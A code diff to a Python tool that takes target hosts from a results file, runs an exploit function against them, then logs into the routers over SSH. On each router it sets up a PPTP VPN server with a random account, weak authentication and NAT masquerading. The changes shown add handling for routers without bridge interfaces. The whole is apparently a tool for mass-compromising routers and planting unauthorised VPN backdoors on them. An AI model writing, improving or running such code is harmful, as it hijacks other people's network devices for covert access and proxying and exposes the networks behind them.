@@ -78,11 +78,13 @@ class CreateVpn:
         bri_mac_addr_list = []
         bri_name_list = []
         bri_out, bri_info = self.ssh.execute('/interface bridge print')
-        # print('bridge out\n',bri_out)
         bri_list = bri_out.split(b'\r\n\r\n')
+        attention = b'Flags: X - disabled, R - running '
+        if bri_list[0] == attention:
+            print('warning')
+            return [], []
         for i in range(0, len(bri_list) - 1):
             per_bri_list = bri_list[i].decode('ascii').split('mac-address=')
-            # print(per_bri_list)
             per_mac_list = per_bri_list[1].split(' ')
             bri_mac_addr = per_mac_list[0]
             bri_mac_addr_list.append(bri_mac_addr)
@@ -91,10 +93,6 @@ class CreateVpn:
             name_list = per_name_list[1].split('"')
             bri_name_list.append(name_list[0])
 
-            # print(per_mac[0])
-            # print(per_bri)
-        # print('bridge info\n',bri_info)
-        # print('bridge mac address list', bri_mac_addr_list, 'bridge name list', bri_name_list)
         return bri_mac_addr_list, bri_name_list
 
     # choose usable ethernet list
@@ -103,20 +101,21 @@ class CreateVpn:
         lan_ethernet_list = []
         eth_info_list = self.get_ethernet()
         bri_mac_addr_list, bri_name_list = self.get_bridge()
-        for i in range(0, len(eth_info_list)):
-            for addr in bri_mac_addr_list:
-                # for addr in bri_mac_addr_list:
-                #     for i in range(0, len(eth_info_list)):
-                if addr not in eth_info_list[i]:
-                    index_list.append(i)
-                else:
-                    break
-        # print(index_list)
-        for index in set(index_list):
-            if ('RS' in eth_info_list[index]) or ('R' in eth_info_list[index]):
-                # print(eth_info_list[index])
-                lan_ethernet_list.append(eth_info_list[index])
-        # print('Lan List\n', lan_ethernet_list)
+        if bri_mac_addr_list == [] and bri_name_list == []:
+            for i in range(0, len(eth_info_list)):
+                if ('RS' in eth_info_list[i]) or ('R' in eth_info_list[i]):
+                    lan_ethernet_list.append(eth_info_list[i])
+        else:
+            for i in range(0, len(eth_info_list)):
+                for addr in bri_mac_addr_list:
+                    if addr not in eth_info_list[i]:
+                        index_list.append(i)
+                    else:
+                        break
+            for index in set(index_list):
+                if ('RS' in eth_info_list[index]) or ('R' in eth_info_list[index]):
+                    lan_ethernet_list.append(eth_info_list[index])
+
         return lan_ethernet_list
 
     # create vpn
@@ -125,7 +124,7 @@ class CreateVpn:
         bri_mac_addr_list, bri_name_list = self.get_bridge()
         usr, pwd = self.random_profile()
 
-        self.ssh.execute('/ip address add address=192.168.100.121/24 interface=' + lan_int)
+        # self.ssh.execute('/ip address add address=192.168.100.121/24 interface=' + lan_int)
 
         self.ssh.execute('/ip pool add name="pptp-vpn-pool" ranges=192.168.100.10-192.168.100.30')
         self.ssh.execute(
@@ -133,9 +132,14 @@ class CreateVpn:
         self.ssh.execute('/ppp secret add name=' + usr + ' profile=pptp-vpn-profile password=' + pwd + ' service=pptp')
         self.ssh.execute(
             '/interface pptp-server server set enabled=yes default-profile=pptp-vpn-profile authentication=mschap2,mschap1,chap,pap')
-        self.ssh.execute(
-            '/ip firewall nat add chain=srcnat src-address=192.168.100.121/24 out-interface=' + bri_name_list[
-                0] + ' action=masquerade')
+        if bri_mac_addr_list == [] and bri_name_list == []:
+            self.ssh.execute(
+                '/ip firewall nat add chain=srcnat src-address=192.168.100.121/24 out-interface=' + lan_int + ' action=masquerade')
+        else:
+            self.ssh.execute(
+                '/ip firewall nat add chain=srcnat src-address=192.168.100.121/24 out-interface=' + bri_name_list[
+                    0] + ' action=masquerade')
+
         return usr, pwd
 
     def disconnect(self):
@@ -163,7 +167,7 @@ def create_main(ip, usr, pwd):
 def vpn(targets):
     info_list = exploit(targets)
     print(info_list)
-    vpn_list=[]
+    vpn_list = []
     for target in info_list:
         ip = target[0]
         print(ip)
@@ -184,6 +188,7 @@ def vpn(targets):
             else:
                 print('wrong password')
     return vpn_list
+
 
 def run():
     targets = format_file('result.txt')
